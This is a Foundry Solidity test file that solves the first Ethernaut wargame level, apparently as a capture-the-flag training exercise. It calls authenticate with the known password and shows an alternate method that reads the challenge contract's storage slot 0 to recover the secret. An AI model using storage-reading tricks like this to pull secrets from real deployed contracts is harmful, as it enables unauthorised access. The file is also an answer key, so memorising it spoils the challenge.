// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IInstance {
  function authenticate(string memory passkey) external;
}

contract HelloTest is Test {
  address internal challengeAddress;
  IInstance internal challenge;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x02293680D707f86D988D98a38810db19119D3C18);
    challenge = IInstance(challengeAddress);
  }

  function testExploit() public {
    // password can be observed from the factory contract
    challenge.authenticate("ethernaut0");

    utils.submitLevelInstance(challengeAddress);
  }

  // alternate solution: you can't read the factory.
  // you can always read the blockchain though
  function _testExploit() public {

    // get the contents of the slot 0 from the challenge address,
    // assuming that this is a string with less than 32 bytes,
    // in that case, length the lowest-order byte stores the value length * 2.
    bytes32 slot0 = vm.load(challengeAddress, bytes32(uint256(0)));
    uint8 len = uint8(slot0[31]) / 2;

    bytes memory password = new bytes(len);

    for (uint8 i = 0; i < len; i++) {
      password[i] = slot0[i];
    }

    // test the found password in the contract
    challenge.authenticate(string(password));

    utils.submitLevelInstance(challengeAddress);
  }
}
